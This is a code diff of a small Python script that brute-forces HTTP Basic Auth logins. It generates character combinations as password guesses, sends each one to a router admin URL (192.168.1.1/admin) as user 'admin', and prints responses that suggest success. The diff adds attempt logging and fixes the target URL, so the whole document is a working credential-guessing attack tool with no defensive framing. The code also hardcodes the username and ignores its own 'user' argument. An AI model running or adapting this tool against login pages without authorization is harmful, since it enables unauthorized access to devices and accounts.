@@ -1,10 +1,10 @@
 import requests
 from time import sleep
 from itertools import combinations
-from typing import Generator
+from typing import Generator, Union
 
 
-def pwd_gen(pwd_len: int = 2, text_output: bool = True) -> Generator | list:
+def pwd_gen(pwd_len: int = 2, text_output: bool = True) -> Union[Generator, str]:
     """Simple brute force pwd generator.
 
     Generates ascending list of ASCII extended set passwords start from size ''->len(N).
@@ -30,7 +30,7 @@ def pwd_gen(pwd_len: int = 2, text_output: bool = True) -> Generator | list:
             else:
                 yield each_combo
 
-def atk(url: str = "", user: str = "admin", limit: float | int = 0.2) -> None:
+def atk(url: str = "", user: str = "admin", limit: Union[int, float] = 0.2) -> None:
     """Guesses passwords for a given URL
 
     Args:
@@ -44,10 +44,14 @@ def atk(url: str = "", user: str = "admin", limit: float | int = 0.2) -> None:
     Returns:
         None -> prints any 200 reponse and the given pwd to terminal
     """
-    for pwd_guess in pwd_gen(pwd_len=2):
-       res = requests.get(url, auth=("admin", pwd_guess))
-       sleep(limit)
-       if res.status_code == 200:
-           print("Got 200 reponse on pwd: {}".format(pwd_guess))
+    for attempt_number, pwd_guess in enumerate(pwd_gen(pwd_len=2)):
+        res = requests.get(url, auth=("admin", pwd_guess))
+        if res.status_code == 200:
+            print("Got 200 reponse on pwd: {}".format(pwd_guess))
+        if res.status_code != 401:
+            print("Got status code of: {}".format(res.status_code))
+        print("Attempt #{} Pwd -> {} Got status: {}".format(attempt_number, pwd_guess, res.status_code))
+        sleep(limit)
 
-atk(url="http://http://192.168.1.1/admin/", user="admin", limit=0.1)
+
+atk(url="http://192.168.1.1/admin/", user="admin", limit=0.3)
